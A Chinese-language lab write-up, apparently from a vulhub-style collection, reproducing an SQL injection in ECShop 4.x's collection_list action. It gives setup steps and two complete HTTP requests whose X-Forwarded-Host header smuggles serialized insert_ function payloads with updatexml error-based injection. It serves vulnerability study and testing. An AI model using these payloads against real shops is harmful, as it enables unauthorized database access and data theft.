# ECShop 4.x collection_list SQL注入

## 环境搭建

执行以下命令启动 ECShop 4.0.6：

```plain
docker-compose up -d
```

服务器启动后，访问http://your-ip:8080安装向导。数据库地址填写为mysql，用户名和密码均为root。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844120719-75053c99-ffe9-4a22-8b0a-2ff6b642d635.png)

注册普通用户user。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844120618-3a34de51-034d-4eb5-b2ac-c370fa0ef0fa.png)

## 漏洞复现

该漏洞的原理与[xianzhi-2017-02-82239600](https://github.com/vulhub/vulhub/tree/master/ecshop/xianzhi-2017-02-82239600#tdsub)类似，可以利用任意insert_函数来实现SQL注入。

有多种insert_函数可以使用。例如，insert_user_account：

```plain
GET /user.php?act=collection_list HTTP/1.1
Host: your-ip:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:{s:7:"user_id";s:38:"0'-(updatexml(1,repeat(user(),2),1))-'";s:7:"payment";s:1:"4";}|45ea207d7a2b68c49582d2d22adf953a
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Cookie: ECS_ID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[user_id]=3;ECS[username]=demo;ECS[visit_times]=2;ECSCP_ID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;
Connection: close
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844120899-57073126-fd66-49c9-a5a1-38bb0b70491d.png)

请注意，您应该首先以普通用户身份登录。

insert_pay_log用作 POC ：

```plain
GET /user.php?act=collection_list HTTP/1.1
Host: 192.168.1.162:8080
X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:44:"1' and updatexml(1,repeat(user(),2),1) and '";|
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
Cookie: ECS_ID=f7b1398a0fdc189b691a6f1c969911ac1eea8fca;ECS[password]=445ac05c4ae0555ed091bb977b08581f;ECS[user_id]=3;ECS[username]=demo;ECS[visit_times]=2;ECSCP_ID=1a8bddd69b3b81efbe441a185ac52e7d24852d87;PHPSESSID=bb2033d66975ff7c2be29896d2d4260c;real_ipd=172.18.0.1;
Connection: close
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780844120923-62beea8d-6091-4ecb-99bb-e8dd069f327c.png)